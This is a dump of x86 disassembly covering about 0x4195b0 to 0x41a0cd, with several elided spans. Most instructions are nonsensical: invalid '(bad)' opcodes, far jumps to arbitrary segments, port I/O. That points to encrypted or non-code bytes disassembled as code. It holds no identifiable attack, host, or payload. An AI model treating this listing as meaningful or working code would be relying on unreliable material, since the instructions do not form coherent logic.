  4195b0:	add    DWORD PTR [ecx+ecx*1-0x51],eax
  4195b4:	push   ebp
  4195b5:	jb     0x419617
  4195b7:	pop    ebp
  4195b8:	data16 aad 0xe3
  4195bb:	adc    edi,DWORD PTR [edi-0x45]
  4195be:	les    esi,FWORD PTR [edx-0x3]
  4195c1:	lods   eax,DWORD PTR ds:[esi]
	...
  419632:	add    BYTE PTR [eax],al
  419634:	xchg   ebx,eax
  419635:	sub    BYTE PTR [eax-0x604344c4],ah
  41963b:	scas   eax,DWORD PTR es:[edi]
  41963c:	jbe    0x4195eb
  41963e:	or     esp,DWORD PTR [eax+0xb9947fc]
  419644:	lods   al,BYTE PTR ds:[esi]
  419645:	adc    eax,DWORD PTR [ecx]
  419647:	add    dh,dh
  419649:	add    BYTE PTR [eax],al
  41964b:	add    BYTE PTR [eax+0x5],al
  41964e:	sar    DWORD PTR [edx],1
  419650:	push   edi
  419651:	pop    es
  419652:	and    eax,0x61b374fd
  419657:	sub    BYTE PTR [esp+esi*2+0x5092f61c],bl
  41965e:	stc    
  41965f:	push   esp
  419660:	mov    ebp,0xe1763c01
  419665:	add    BYTE PTR [esi+eiz*4+0x3024640e],cl
  41966c:	mov    ds:0x6c11c159,al
  419671:	ret    0xdc82
  419674:	fisttp WORD PTR [edi]
  419676:	scas   eax,DWORD PTR es:[edi]
  419677:	push   esi
  419678:	and    edi,DWORD PTR [edi+eiz*1]
  41967b:	xchg   BYTE PTR [ebx-0x1ab4b153],al
  419681:	fld    DWORD PTR [edx+edx*4]
  419684:	bound  ebx,QWORD PTR [eax]
  419686:	push   ds
  419687:	xchg   edi,eax
  419688:	nop
  419689:	jecxz  0x41963b
  41968b:	or     eax,0xb05e47c3
  419690:	je     0x419707
  419692:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419693:	jbe    0x41970a
  419695:	xor    BYTE PTR [edi],ch
  419697:	fnstsw WORD PTR [ebx]
  419699:	(bad)  
  41969a:	hlt    
  41969b:	dec    ebx
  41969c:	mov    bh,0xc5
  41969e:	int3   
  41969f:	and    al,0x58
  4196a1:	mov    al,0x55
  4196a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4196a4:	mov    esi,0x3359114d
  4196a9:	sbb    eax,0xee77f735
  4196ae:	inc    edx
  4196af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4196b0:	lods   eax,DWORD PTR ds:[esi]
  4196b1:	adc    eax,0x53ca2fe9
  4196b6:	mov    cs,WORD PTR [eax]
  4196b8:	mov    edx,0x20e0209
  4196bd:	adc    al,0xcc
  4196bf:	ds out dx,eax
  4196c1:	or     esi,DWORD PTR [edx+edx*2-0x6e779735]
  4196c8:	adc    cl,BYTE PTR ds:0xeb6b05fe
  4196ce:	jmp    FWORD PTR [edx+0x70]
  4196d1:	les    ecx,FWORD PTR [ecx+0x2b79b37d]
  4196d7:	and    DWORD PTR [ebp+0x5d5f1a98],edx
  4196dd:	(bad)  
  4196df:	repz jge 0x4196c4
  4196e2:	shl    DWORD PTR [edx-0x17],cl
  4196e5:	inc    esi
  4196e6:	jnp    0x4196cd
  4196e8:	fcompp 
  4196ea:	push   cs
  4196eb:	fxch   st(0)
  4196ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4196ee:	pop    esi
  4196ef:	xchg   ebx,eax
  4196f0:	(bad)  
  4196f1:	loopne 0x41975b
  4196f3:	loope  0x4196f2
  4196f5:	jmp    0x3135:0x34e0d6b3
  4196fc:	dec    eax
  4196fd:	clc    
  4196fe:	add    al,0x67
  419700:	xchg   ebx,eax
  419701:	and    BYTE PTR [ebp+0x69],0xfc
  419705:	call   0xa15f:0x7b051468
  41970c:	inc    ecx
  41970d:	sbb    BYTE PTR [ecx],al
  41970f:	nop
  419710:	int3   
  419711:	mov    al,0x70
  419713:	jmp    0x4196ff
  419715:	push   ss
  419716:	imul   ecx,edx,0x1da9a099
  41971c:	add    eax,0x8a093d3c
  419721:	pop    eax
  419722:	retf   0x844b
  419725:	mov    bh,0xc1
  419727:	mov    dh,0x0
  419729:	(bad)  
  41972a:	jnp    0x41972e
  41972c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41972d:	xor    eax,0x22a1fd38
  419732:	and    al,0x2
  419734:	mov    cs,WORD PTR [esi-0x1c132e02]
  41973a:	loope  0x4196c4
  41973c:	pop    esp
  41973d:	jne    0x4196dd
  41973f:	push   ebx
  419740:	mov    esi,0x7b
	...
  4197b1:	add    BYTE PTR [eax],al
  4197b3:	add    BYTE PTR [eax+ecx*8-0x80bcc9],dl
  4197ba:	hlt    
  4197bb:	fist   WORD PTR [ecx+0x2f27cbe9]
  4197c1:	xlat   BYTE PTR ds:[ebx]
  4197c2:	xchg   dl,ch
  4197c4:	mov    ds:0xf6000114,al
  4197c9:	add    BYTE PTR [eax],al
  4197cb:	add    BYTE PTR [edi-0x76],bh
  4197ce:	mov    esi,0xcf99fc33
  4197d3:	dec    ebx
  4197d4:	jne    0x419829
  4197d6:	dec    ebp
  4197d7:	xchg   edx,eax
  4197d8:	ss sbb al,0xc5
  4197db:	jae    0x4197cb
  4197dd:	push   0xffffffcb
  4197df:	push   edx
  4197e0:	je     0x4197da
  4197e2:	fstp   DWORD PTR [esi+0x3126cdea]
  4197e8:	jg     0x419804
  4197ea:	push   esi
  4197eb:	sbb    ebp,DWORD PTR [eax-0x159cb9f2]
  4197f1:	dec    ebp
  4197f2:	mov    al,0xe2
  4197f4:	or     eax,0x56e4417e
  4197f9:	pop    eax
  4197fa:	pop    es
  4197fb:	fsubr  QWORD PTR [eax+ebx*2+0x6142499c]
  419802:	mov    gs,WORD PTR [ecx]
  419804:	add    eax,0x2cd6f1b7
  419809:	cmp    al,0x2f
  41980b:	das    
  41980c:	jns    0x419887
  41980e:	push   0xcde66d20
  419813:	mov    ecx,0x5f7b330d
  419818:	fisttp WORD PTR [ebx-0x4806f1]
  41981e:	jno    0x419841
  419820:	cmp    ebx,DWORD PTR [ebx-0x5a]
  419823:	rcr    edx,1
  419825:	ret    
  419826:	push   ecx
  419827:	into   
  419828:	or     al,0x97
  41982a:	jmp    0x3c8d:0x782466a4
  419831:	lods   al,BYTE PTR ds:[esi]
  419832:	nop
  419833:	fild   QWORD PTR [ecx]
  419835:	ins    BYTE PTR es:[edi],dx
  419836:	fiadd  WORD PTR [esi]
  419838:	push   esi
  419839:	pop    ebp
  41983a:	jbe    0x41988e
  41983c:	adc    DWORD PTR [edi-0x57],edx
  41983f:	inc    ecx
  419840:	fs push ss
  419842:	int    0xe1
  419844:	fadd   DWORD PTR [ecx]
  419846:	shr    DWORD PTR [edi+0x22],0x5c
  41984a:	aam    0x23
  41984c:	mov    ah,al
  41984e:	cmc    
  41984f:	pop    ecx
  419850:	ret    
  419851:	aaa    
  419852:	rcr    DWORD PTR [edi],cl
  419854:	pusha  
  419855:	pop    edx
  419856:	push   ebx
  419857:	mov    al,ds:0x91963b19
  41985c:	sub    DWORD PTR [ecx],esi
  41985e:	hlt    
  41985f:	add    al,0x20
  419861:	cmp    cl,0xef
  419864:	idiv   DWORD PTR [ebx+ebp*1+0x15]
  419868:	add    eax,0xc7702659
  41986d:	mov    ebx,0x7f50e3dd
  419872:	xchg   esp,eax
  419873:	out    dx,al
  419874:	mov    WORD PTR ds:0x17b1b605,ss
  41987a:	adc    al,0xba
  41987c:	rol    esi,cl
  41987e:	jns    0x4198e1
  419880:	repnz mov edx,0xb46a916f
  419886:	dec    dh
  419888:	bound  esp,QWORD PTR [ebp+0x77]
  41988b:	dec    ebp
  41988c:	icebp  
  41988d:	jne    0x419831
  41988f:	ret    
  419890:	(bad)  
  419891:	call   0xdba:0xe166dc8b
  419898:	loop   0x419888
  41989a:	xor    BYTE PTR [esi+0x3b],al
  41989d:	sub    eax,0x1faeaf61
  4198a2:	mov    BYTE PTR [eax],dh
  4198a4:	pop    esp
  4198a5:	cmp    DWORD PTR [eax-0x78bc43bd],0x796ab514
  4198af:	mov    esi,0xb36154ec
  4198b4:	xchg   edx,eax
  4198b5:	mov    cl,0xb1
  4198b7:	les    edx,FWORD PTR [ebp+0x2d]
  4198ba:	mov    bh,0x5e
  4198bc:	leave  
  4198bd:	stos   DWORD PTR es:[edi],eax
  4198be:	in     al,dx
  4198bf:	xor    ebx,edi
  4198c1:	pop    edi
	...
  419932:	add    BYTE PTR [eax],al
  419934:	mov    WORD PTR [ecx-0x28a2e9ac],ss
  41993a:	into   
  41993b:	fwait
  41993c:	test   BYTE PTR [ecx-0x28],0x94
  419940:	mov    BYTE PTR [ebx+0x20],cl
  419943:	loopne 0x4198dd
  419945:	adc    eax,0xf60001
  41994a:	add    BYTE PTR [eax],al
  41994c:	mov    ds:0x2b098c37,al
  419951:	push   edi
  419952:	fidivr DWORD PTR [eax]
  419954:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  419956:	push   edi
  419957:	in     eax,0x1f
  419959:	ins    BYTE PTR es:[edi],dx
  41995a:	and    DWORD PTR [eax+0x1f],ebp
  41995d:	or     BYTE PTR [ebx+0x6c],bl
  419960:	xchg   esi,eax
  419961:	adc    ecx,DWORD PTR [ebx]
  419963:	ins    DWORD PTR es:[edi],dx
  419964:	jo     0x419952
  419966:	xchg   esp,eax
  419967:	retf   
  419968:	inc    edx
  419969:	out    dx,eax
  41996a:	jbe    0x419927
  41996c:	xor    eax,0x66db9174
  419971:	add    al,0xb8
  419973:	xchg   edx,eax
  419974:	push   ecx
  419975:	push   ebx
  419976:	ror    DWORD PTR [edi+0x24],1
  419979:	push   cs
  41997a:	lods   al,BYTE PTR ds:[esi]
  41997b:	aaa    
  41997c:	mov    WORD PTR [edi-0x4212556c],es
  419982:	ret    0x679
  419985:	(bad)  
  419986:	pop    esp
  419987:	mov    eax,0x351a13ee
  41998c:	loope  0x419992
  41998e:	cmp    DWORD PTR [esi],esp
  419990:	xchg   edx,eax
  419991:	out    0x86,eax
  419993:	fst    DWORD PTR [edi]
  419995:	bound  ebp,QWORD PTR [ebx+0x3577a3ed]
  41999b:	repz xchg ebx,eax
  41999d:	or     dh,BYTE PTR [ebp+0x2ee8fc77]
  4199a3:	into   
  4199a4:	(bad)  
  4199a6:	sbb    al,BYTE PTR [edx-0x3e6b6cee]
  4199ac:	mov    ds:0x3168566d,eax
  4199b1:	repnz (bad) 
  4199b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4199b4:	sar    BYTE PTR [eax],0xc5
  4199b7:	jl     0x419974
  4199b9:	push   DWORD PTR ds:0xab07bf0c
  4199bf:	fwait
  4199c0:	mov    dl,0xcf
  4199c2:	xor    eax,0xa06a0322
  4199c7:	and    BYTE PTR [edx+0x761cd368],dh
  4199cd:	cmp    edi,DWORD PTR [ebx-0x64]
  4199d0:	mov    al,ds:0x4f94acfb
  4199d5:	cmp    eax,0xa74efb7
  4199da:	mov    cl,0x68
  4199dc:	xor    ebx,esi
  4199de:	cmp    bh,ch
  4199e0:	or     BYTE PTR [ebp+0x3ce6e4e3],ch
  4199e6:	mov    DWORD PTR [ebp-0x46],edi
  4199e9:	adc    esi,DWORD PTR [esi+0x2b]
  4199ec:	cmp    BYTE PTR [edx+ebp*8-0x1d],al
  4199f0:	xchg   BYTE PTR [ecx-0x21],bh
  4199f3:	mov    fs,WORD PTR [ebx-0x6114877f]
  4199f9:	adc    al,bh
  4199fb:	inc    edx
  4199fc:	and    al,0x27
  4199fe:	and    BYTE PTR [eax+0x52],ah
  419a01:	cs push eax
  419a03:	xchg   ebx,eax
  419a04:	mov    dh,0x65
  419a06:	push   ebp
  419a07:	inc    esp
  419a08:	test   al,bh
  419a0a:	dec    esp
  419a0b:	push   ebx
  419a0c:	xchg   ebp,eax
  419a0d:	mov    esi,0xa3d8e14e
  419a12:	hlt    
  419a13:	push   cs
  419a14:	jne    0x419a47
  419a16:	cmp    al,0xf4
  419a18:	loop   0x419a34
  419a1a:	mov    edi,0xead8358a
  419a1f:	jp     0x4199f9
  419a21:	test   ebp,ecx
  419a23:	icebp  
  419a24:	imul   eax,DWORD PTR [ebp-0x42b2c1ef],0x3e0761ac
  419a2e:	jle    0x419a09
  419a30:	scas   al,BYTE PTR es:[edi]
  419a31:	pop    esp
  419a32:	retf   
  419a33:	push   es
  419a34:	push   ss
  419a35:	push   eax
  419a36:	retf   
  419a37:	lods   eax,DWORD PTR ds:[esi]
  419a38:	mov    BYTE PTR [edi-0x36],bl
  419a3b:	retf   0x6d48
  419a3e:	(bad)  
  419a3f:	xor    esp,DWORD PTR [edx]
  419a41:	adc    eax,DWORD PTR [eax]
	...
  419ab3:	add    BYTE PTR [ebx+edx*1-0x7b],bh
  419ab7:	xor    ch,bh
  419ab9:	mov    dh,0xff
  419abb:	pop    edi
  419abc:	mov    ebp,0x1357b47
  419ac1:	aad    0x27
  419ac3:	stos   DWORD PTR es:[edi],eax
  419ac4:	mov    ss,WORD PTR [esi]
  419ac6:	add    DWORD PTR [eax],eax
  419ac8:	test   BYTE PTR [eax],0x0
  419acb:	add    BYTE PTR [edi+edi*1+0x30],ch
  419acf:	cmp    al,0x6d
  419ad1:	fld    st(7)
  419ad3:	nop
  419ad4:	sar    DWORD PTR [eax-0x7cd84b0f],1
  419ada:	gs aad 0x93
  419add:	sub    eax,0x3bc56808
  419ae2:	in     al,0xcb
  419ae4:	in     al,dx
  419ae5:	fidivr WORD PTR [esp+esi*1+0x5d85ee38]
  419aec:	dec    esi
  419aed:	cmp    eax,DWORD PTR [ecx-0x65683a27]
  419af3:	addr16 push esp
  419af5:	(bad)
  419af9:	sbb    edi,ebp
  419afb:	sub    BYTE PTR [esi],dl
  419afd:	jb     0x419b5f
  419aff:	imul   ebx,DWORD PTR [edx-0x37],0x48a10ca9
  419b06:	inc    edx
  419b07:	jno    0x419b4e
  419b09:	cdq    
  419b0a:	cmp    al,0x7
  419b0c:	jmp    0x419b76
  419b0e:	inc    eax
  419b0f:	jp     0x419b6d
  419b11:	xlat   BYTE PTR ds:[ebx]
  419b12:	mov    al,ds:0x20595ca1
  419b17:	mov    al,0x38
  419b19:	sub    BYTE PTR [ebx],dl
  419b1b:	mov    ecx,0x8ce8302e
  419b20:	push   edi
  419b21:	jns    0x419ae1
  419b23:	adc    eax,0x7862ae35
  419b28:	pop    ebp
  419b29:	scas   eax,DWORD PTR es:[edi]
  419b2a:	scas   al,BYTE PTR es:[edi]
  419b2b:	outs   dx,DWORD PTR ds:[esi]
  419b2c:	scas   eax,DWORD PTR es:[edi]
  419b2d:	sub    esi,DWORD PTR [edi-0x25d418e]
  419b33:	inc    edi
  419b34:	cld    
  419b35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419b36:	mov    ebx,0x3b2407fe
  419b3b:	mov    eax,0x30830253
  419b40:	gs jmp 0xa0b98086
  419b46:	xlat   BYTE PTR ds:[ebx]
  419b47:	mov    ebp,0xde798145
  419b4c:	bound  esp,QWORD PTR [ebp+0x48]
  419b4f:	jne    0x419ad9
  419b51:	cmp    bl,BYTE PTR [edx+ebp*2]
  419b54:	jns    0x419b0b
  419b56:	fdiv   QWORD PTR [esi-0x9]
  419b59:	retf   
  419b5a:	mov    esi,0x5c564045
  419b5f:	cmp    DWORD PTR [eax-0xf],edx
  419b62:	pop    eax
  419b63:	or     al,BYTE PTR [edx+0x2d60921f]
  419b69:	sti    
  419b6a:	popa   
  419b6b:	test   DWORD PTR [ebx-0x253584c2],esp
  419b71:	dec    ecx
  419b72:	xor    edx,DWORD PTR [ebx-0x410aa1dd]
  419b78:	add    dl,ah
  419b7a:	xor    DWORD PTR [edx+0x220a2470],ebp
  419b80:	(bad)  
  419b81:	push   ss
  419b82:	sbb    DWORD PTR [esi-0x25],edi
  419b85:	mov    ebp,0x3587881f
  419b8a:	jbe    0x419baf
  419b8c:	les    edx,FWORD PTR ds:0xb8054cca
  419b92:	cvtdq2ps xmm6,XMMWORD PTR [esi-0xf67fd1]
  419b99:	sbb    edi,DWORD PTR ds:0x327f436c
  419b9f:	out    0x9a,al
  419ba1:	pop    ebp
  419ba2:	dec    esp
  419ba3:	or     ebx,esi
  419ba5:	mov    ch,0x9a
  419ba7:	pushf  
  419ba8:	out    0x77,eax
  419baa:	outs   dx,BYTE PTR ds:[esi]
  419bab:	xor    DWORD PTR [esi+0x72],edx
  419bae:	mov    ebp,0x7dd275a3
  419bb3:	dec    ecx
  419bb4:	pop    es
  419bb5:	mov    al,0x9d
  419bb7:	ins    BYTE PTR es:[edi],dx
  419bb8:	popf   
  419bb9:	iret   
  419bba:	shl    ebp,0xdf
  419bbd:	xchg   edx,eax
  419bbe:	test   DWORD PTR [ebp+0x71],edi
  419bc1:	pop    DWORD PTR [eax]
	...
  419c33:	add    bl,bh
  419c35:	inc    edx
  419c36:	out    dx,al
  419c37:	aas    
  419c38:	(bad)  
  419c39:	mov    edi,0x157c6fb
  419c3e:	sub    esi,0x3a
  419c41:	push   edi
  419c42:	(bad)  
  419c43:	in     eax,dx
  419c44:	test   BYTE PTR [edi],dl
  419c46:	add    DWORD PTR [eax],eax
  419c48:	test   BYTE PTR [eax],0x0
  419c4b:	add    ch,bh
  419c4d:	xchg   edx,eax
  419c4e:	scas   eax,DWORD PTR es:[edi]
  419c4f:	arpl   WORD PTR [edi+0x10],sp
  419c52:	jmp    0x7930:0xa0c551b3
  419c59:	call   0x2a63:0x47165b5b
  419c60:	lock (bad) 
  419c63:	and    al,dh
  419c65:	push   edx
  419c66:	pusha  
  419c67:	gs test bl,dh
  419c6a:	jecxz  0x419c59
  419c6c:	push   ds
  419c6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c6e:	(bad)  
  419c6f:	push   ebp
  419c70:	adc    eax,0x2149164b
  419c75:	mov    bh,0xe
  419c77:	popf   
  419c78:	pop    ebx
  419c79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c7a:	cwde   
  419c7b:	out    0x44,eax
  419c7d:	jl     0x419c32
  419c7f:	ds aas 
  419c81:	xchg   esp,eax
  419c82:	or     dl,BYTE PTR [edx]
  419c84:	push   ss
  419c85:	or     al,0x68
  419c87:	dec    esp
  419c88:	push   ds
  419c89:	or     al,0x62
  419c8b:	rcl    ebx,cl
  419c8d:	hlt    
  419c8e:	and    al,0xf1
  419c90:	in     eax,0xbb
  419c92:	sub    BYTE PTR [ebx],dh
  419c94:	shl    DWORD PTR [edx-0x5cb7448f],cl
  419c9a:	lea    edx,gs:[edi]
  419c9d:	mov    ebp,0x541c34c3
  419ca2:	js     0x419c41
  419ca4:	jge    0x419d21
  419ca6:	jno    0x419c6c
  419ca8:	jp     0x419c66
  419caa:	xchg   esi,eax
  419cab:	or     ch,bl
  419cad:	adc    bl,ch
  419caf:	jnp    0x419c8e
  419cb1:	jle    0x419cf3
  419cb3:	shl    BYTE PTR [edx],0x94
  419cb6:	and    eax,0x6531d363
  419cbb:	push   ecx
  419cbc:	dec    esp
  419cbd:	sub    esi,DWORD PTR ds:0x982b9cf3
  419cc3:	xor    al,BYTE PTR [ecx-0x17]
  419cc6:	dec    ecx
  419cc7:	xor    dh,bl
  419cc9:	xlat   BYTE PTR ds:[ebx]
  419cca:	sbb    bl,BYTE PTR [ecx-0x7f]
  419ccd:	popf   
  419cce:	lock inc esi
  419cd0:	sahf   
  419cd1:	jg     0x419d30
  419cd3:	cmp    dh,bh
  419cd5:	xchg   esi,eax
  419cd6:	daa    
  419cd7:	add    al,0xdc
  419cd9:	das    
  419cda:	in     al,0xaa
  419cdc:	xchg   BYTE PTR [esi],al
  419cde:	loope  0x419d0d
  419ce0:	jmp    0x78b:0xf94627f7
  419ce7:	(bad)  
  419ce8:	fbld   TBYTE PTR [ebp-0x49bbed93]
  419cee:	rol    BYTE PTR [ebp+0x1fa15c9a],0xfa
  419cf5:	pop    esp
  419cf6:	shl    bl,0x98
  419cf9:	or     eax,0x49cce5f8
  419cfe:	xchg   DWORD PTR ds:0xfdfc99e1,edx
  419d04:	mov    dl,al
  419d06:	into   
  419d07:	int    0x5e
  419d09:	mov    DWORD PTR [edx],eax
  419d0b:	fld    DWORD PTR [ebx]
  419d0d:	adc    edi,ecx
  419d0f:	add    BYTE PTR ds:0xc8a09cc9,0x36
  419d16:	xor    al,0xad
  419d18:	hlt    
  419d19:	enter  0x9ab2,0xa8
  419d1d:	xchg   esi,eax
  419d1e:	in     eax,0x90
  419d20:	mov    eax,0xc50ce2e4
  419d25:	std    
  419d26:	je     0x419cde
  419d28:	(bad)  
  419d29:	out    dx,al
  419d2a:	cmp    esi,ebx
  419d2c:	xor    ch,BYTE PTR [esi+0x4d]
  419d2f:	sti    
  419d30:	inc    esp
  419d31:	or     bh,BYTE PTR [edi-0x59ab7dc6]
  419d37:	xor    bl,cl
  419d39:	imul   ebp,DWORD PTR [ecx+0x1db9fbab],0xb11761
	...
  419db3:	add    BYTE PTR [esi],cl
  419db5:	bnd call 0xde7c99eb
  419dbb:	(bad)  
  419dbc:	jp     0x419e27
  419dbe:	xchg   edi,eax
  419dbf:	inc    esp
  419dc0:	test   eax,0x7ad93727
  419dc5:	sbb    BYTE PTR [ecx],al
  419dc7:	add    dh,dh
  419dc9:	add    BYTE PTR [eax],al
  419dcb:	add    BYTE PTR [esi+esi*1+0x54],dl
  419dcf:	push   edx
  419dd0:	ret    0xdf69
  419dd3:	cdq    
  419dd4:	xor    DWORD PTR [edx+0x28],0xffffff83
  419dd8:	jl     0x419ddb
  419dda:	dec    ecx
  419ddb:	push   ebx
  419ddd:	mov    ch,0xaa
  419ddf:	inc    edx
  419de0:	mov    esp,0x9c84a733
  419de5:	arpl   si,bp
  419de7:	xor    eax,0x59ee90e1
  419dec:	pop    esi
  419ded:	cwde   
  419dee:	lods   eax,DWORD PTR ds:[esi]
  419def:	mov    ah,0x9d
  419df1:	mov    ch,0x27
  419df3:	push   ecx
  419df4:	mov    ecx,0x22756ad5
  419df9:	pop    edi
  419dfa:	jb     0x419e44
  419dfc:	loopne 0x419e36
  419dfe:	and    esi,DWORD PTR [edi+0x4649e6b2]
  419e04:	inc    edx
  419e05:	mov    ah,0x67
  419e07:	ds (bad) 
  419e09:	enter  0x8a79,0x2f
  419e0d:	jl     0x419e0f
  419e0f:	mov    edx,0xae636908
  419e14:	rcr    dl,cl
  419e16:	xor    al,0x8c
  419e18:	xchg   edx,eax
  419e19:	cmc    
  419e1a:	call   0x20822747
  419e1f:	leave  
  419e20:	push   0x49
  419e22:	outs   dx,BYTE PTR ds:[esi]
  419e23:	push   ecx
  419e24:	ja     0x419dfe
  419e26:	fistp  WORD PTR [edi]
  419e28:	xchg   ecx,eax
  419e29:	ins    DWORD PTR es:[edi],dx
  419e2a:	imul   esp,DWORD PTR [ebx-0x7678d0de],0xffffffaa
  419e31:	mov    edx,eax
  419e33:	jl     0x419e30
  419e35:	jo     0x419df8
  419e37:	xor    esp,DWORD PTR [eax]
  419e39:	cmc    
  419e3a:	scas   eax,DWORD PTR es:[edi]
  419e3b:	mov    eax,ds:0xd3feadf
  419e40:	test   DWORD PTR [ecx+0x134efb3f],esi
  419e46:	lahf   
  419e47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e48:	sar    DWORD PTR [ebx-0x3f],0x23
  419e4c:	inc    eax
  419e4d:	dec    esp
  419e4e:	test   eax,0x828fe4fd
  419e53:	arpl   WORD PTR [ebp+0x753bdc06],bx
  419e59:	push   es
  419e5a:	jle    0x419e62
  419e5c:	out    dx,al
  419e5d:	rol    DWORD PTR [ebx-0x29b2edf],cl
  419e63:	aaa    
  419e64:	mov    fs,WORD PTR [esi+0x49]
  419e67:	(bad)  
  419e68:	popa   
  419e69:	adc    dh,BYTE PTR [ecx-0xa99b6cc]
  419e6f:	sbb    edx,DWORD PTR [ecx]
  419e71:	push   cs
  419e72:	fbld   TBYTE PTR [edx+0x7f5bdc2d]
  419e78:	inc    BYTE PTR [edx-0x5972e5f8]
  419e7e:	nop
  419e7f:	jns    0x419e16
  419e81:	je     0x419e61
  419e83:	push   ebx
  419e84:	push   ebp
  419e85:	test   eax,0xf28f5bdb
  419e8a:	(bad)  
  419e8b:	retf   
  419e8c:	and    BYTE PTR [ebx+0x4f],0x16
  419e90:	xlat   BYTE PTR ds:[ebx]
  419e91:	into   
  419e92:	push   0x55
  419e94:	icebp  
  419e95:	daa    
  419e96:	inc    ebp
  419e97:	pusha  
  419e98:	cmp    BYTE PTR [eax],dh
  419e9a:	ds in  eax,dx
  419e9c:	sbb    edi,esp
  419e9e:	dec    esp
  419e9f:	dec    ebp
  419ea0:	xchg   ebx,eax
  419ea1:	pop    edx
  419ea2:	add    al,0x9a
  419ea4:	jb     0x419e8a
  419ea6:	pop    ss
  419ea7:	ins    BYTE PTR es:[edi],dx
  419ea8:	mov    DWORD PTR [edx+ebx*8],ebx
  419eab:	repz mov al,es:0xf9b768fb
  419eb2:	ret    0xa03
  419eb5:	dec    DWORD PTR [ecx-0x16]
  419eb8:	imul   BYTE PTR [edi-0x34]
  419ebb:	arpl   WORD PTR [edx+0x8],cx
  419ebe:	mov    edx,0x62b53a
	...
  419f33:	add    BYTE PTR [edi+edx*4],bl
  419f36:	in     al,0x47
  419f38:	out    dx,eax
  419f39:	ja     0x419efa
  419f3b:	fbstp  TBYTE PTR [ebx-0x4a61f4b7]
  419f41:	das    
  419f42:	je     0x419f42
  419f44:	jo     0x419f5f
  419f46:	add    DWORD PTR [eax],eax
  419f48:	test   BYTE PTR [eax],0x0
  419f4b:	add    BYTE PTR ds:0xdd0e998c,bh
  419f51:	push   ebx
  419f52:	mov    ebp,0x31451948
  419f57:	(bad)
  419f5a:	xchg   ecx,ebx
  419f5c:	cmp    eax,0x1ccb5128
  419f61:	xor    al,0xaf
  419f63:	add    al,0x34
  419f65:	pmovmskb esi,mm3
  419f68:	mov    ds:0xa7b388ae,eax
  419f6d:	imul   esp,DWORD PTR [ebx+0x2a597e1e],0xffffffb2
  419f74:	sub    ebx,edi
  419f76:	lods   al,BYTE PTR ds:[esi]
  419f77:	aas    
  419f78:	scas   al,BYTE PTR es:[edi]
  419f79:	jb     0x419f03
  419f7b:	ja     0x419f3d
  419f7d:	cmp    eax,0x666c0264
  419f82:	mov    cl,0x1d
  419f84:	dec    ecx
  419f85:	ret    
  419f86:	fistp  WORD PTR [edi-0x39]
  419f89:	jns    0x419fa8
  419f8b:	fsubr  DWORD PTR ds:0x9fe508f1
  419f91:	shl    BYTE PTR [edi],0x37
  419f94:	pop    edi
  419f95:	cli    
  419f96:	aad    0xfe
  419f98:	iret   
  419f99:	push   edi
  419f9a:	loop   0x419f55
  419f9c:	adc    ecx,0xffffffc7
  419f9f:	int    0xe6
  419fa1:	xlat   BYTE PTR ds:[ebx]
  419fa2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419fa3:	jmp    0x419fc7
  419fa5:	(bad)  
  419fa6:	pushf  
  419fa7:	sbb    DWORD PTR [eax+edi*1+0x76],0xffffff9c
  419fac:	adc    esi,DWORD PTR [ebp+0x1bc025a2]
  419fb2:	inc    ecx
  419fb3:	call   0x529317d7
  419fb8:	(bad)  
  419fba:	xchg   esi,eax
  419fbb:	fstp   DWORD PTR [eax+0x3bd9883c]
  419fc1:	push   ecx
  419fc2:	xchg   esp,eax
  419fc3:	or     DWORD PTR [eax-0x50],edi
  419fc6:	test   DWORD PTR [esp+esi*2+0x20964350],edi
  419fcd:	cmp    ecx,DWORD PTR [ecx-0x37]
  419fd0:	adc    cl,BYTE PTR [esi]
  419fd2:	(bad)  
  419fd3:	pop    ss
  419fd4:	cmp    DWORD PTR [eax+ebp*8],0x6
  419fd8:	push   esp
  419fd9:	mov    ebp,0xa605a779
  419fde:	aad    0xf0
  419fe0:	dec    eax
  419fe1:	ret    0x3b59
  419fe4:	cld    
  419fe5:	aam    0xaf
  419fe7:	call   FWORD PTR [ebp-0x761710ab]
  419fed:	mov    bh,BYTE PTR ds:0xed71480a
  419ff3:	jg     0x419ff6
  419ff5:	jae    0x41a000
  419ff7:	loope  0x419fd4
  419ff9:	ret    0xdb48
  419ffc:	xchg   DWORD PTR [ebp-0x29],ecx
  419fff:	push   eax
  41a000:	stc    
  41a001:	dec    ecx
  41a002:	mov    eax,0xcc096df2
  41a007:	and    DWORD PTR [ebx+0x615b7674],esp
  41a00d:	mov    dl,0x3
  41a00f:	popf   
  41a010:	pop    edi
  41a011:	dec    eax
  41a012:	in     al,0x1b
  41a014:	out    0x7a,al
  41a016:	lock outs dx,BYTE PTR ds:[esi]
  41a018:	cmp    ebp,DWORD PTR [ebx+0x7a]
  41a01b:	mov    eax,ds:0x214a88a3
  41a020:	lods   al,BYTE PTR ds:[esi]
  41a021:	pushf  
  41a022:	cmp    al,0xc6
  41a024:	aad    0xd8
  41a026:	push   ebp
  41a027:	inc    ebp
  41a028:	arpl   bp,cx
  41a02a:	(bad)  
  41a02c:	dec    ebx
  41a02d:	cmc    
  41a02e:	fldcw  WORD PTR [ebx-0x68]
  41a031:	loop   0x41a029
  41a033:	mov    DWORD PTR [ecx+0x4bbd8947],0xeace6231
  41a03d:	cmp    esi,DWORD PTR [edx+0xd43a7c]
	...
  41a0b3:	add    BYTE PTR [edi-0x41bd617b],ch
  41a0b9:	pop    ebx
  41a0ba:	(bad)  
  41a0bb:	in     eax,dx
  41a0bc:	(bad)  ds:0x269704a2
  41a0c2:	ins    BYTE PTR es:[edi],dx
  41a0c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a0c4:	data16 sbb al,BYTE PTR [ecx]
  41a0c7:	add    dh,dh
  41a0c9:	add    BYTE PTR [eax],al
  41a0cb:	add    BYTE PTR [ecx],dl
  41a0cd:	addr16 icebp 
